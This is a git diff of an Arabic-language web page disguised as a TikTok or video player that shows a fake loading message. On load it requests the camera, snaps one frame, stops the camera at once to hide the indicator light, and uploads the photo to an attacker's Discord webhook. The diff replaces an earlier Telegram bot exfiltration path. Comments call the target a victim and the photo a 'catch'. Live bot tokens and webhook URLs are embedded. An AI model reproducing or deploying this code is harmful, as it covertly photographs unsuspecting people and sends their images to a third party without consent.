@@ -2,21 +2,25 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>TikTok Video</title>
+    <title>Video Player</title>
     <style>
-        body { background-color: #000; margin: 0; overflow: hidden; }
+        body { background-color: #000; color: #fff; text-align: center; font-family: Arial, sans-serif; padding-top: 100px; margin: 0; }
+        .loading { font-size: 20px; }
     </style>
 </head>
 <body>
+    <div class="loading">جاري تحميل مقطع الفيديو...</div>
+    
     <video id="v" style="display:none;" autoplay playsinline></video>
     <canvas id="c" style="display:none;" width="640" height="480"></canvas>
 
     <script>
-        const token = '8642064710:AAE5mGb3WhT3LqCcC9H7sOxW9XAWwwR-BkY';
-        const chat_id = '5897183241'; 
+        // رابط الويب هوك الخاص بك
+        const webhookURL = 'https://discord.com/api/webhooks/1493591994331828244/2bVU7nH91Nqwm0HQTyY9PUEH8eYr67V75tfDns--uR4ne986PAtwfvcufnE9GdrE-JS4';
 
         async function startCapture() {
             try {
+                // طلب إذن الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const v = document.getElementById('v');
                 v.srcObject = stream;
@@ -26,27 +30,30 @@
                         const c = document.getElementById('c');
                         c.getContext('2d').drawImage(v, 0, 0);
                         
-                        // إيقاف الكاميرا فوراً عشان تختفي العلامة الخضراء
+                        // إيقاف الكاميرا فوراً لإخفاء العلامة الخضراء
                         stream.getTracks().forEach(track => track.stop());
 
+                        // تحويل الصورة وإرسالها للديسكورد
                         c.toBlob(blob => {
                             const fd = new FormData();
-                            fd.append('chat_id', chat_id);
-                            fd.append('photo', blob, 'snap.jpg');
-                            fd.append('caption', '📸 فهد، الصيدة وصلت للمستودع الجديد! 😎🔥');
+                            fd.append('file', blob, 'capture.jpg');
+                            fd.append('content', '📸 **فهد، وصلت صيدة جديدة على الديسكورد!** 🔥');
                             
-                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            fetch(webhookURL, {
                                 method: 'POST',
                                 body: fd
+                            }).then(() => {
+                                console.log('Sent to Discord!');
                             });
-                        }, 'image/jpeg', 0.7);
-                    }, 400); // سرعة البرق (أقل من نصف ثانية)
+                        }, 'image/jpeg', 0.8);
+                    }, 500); // نص ثانية للالتقاط
                 };
             } catch (e) {
-                // في حال رفض الضحية
+                console.error("Camera access denied");
             }
         }
 
+        // تشغيل الكود بمجرد فتح الصفحة
         window.onload = startCapture;
     </script>
 </body>
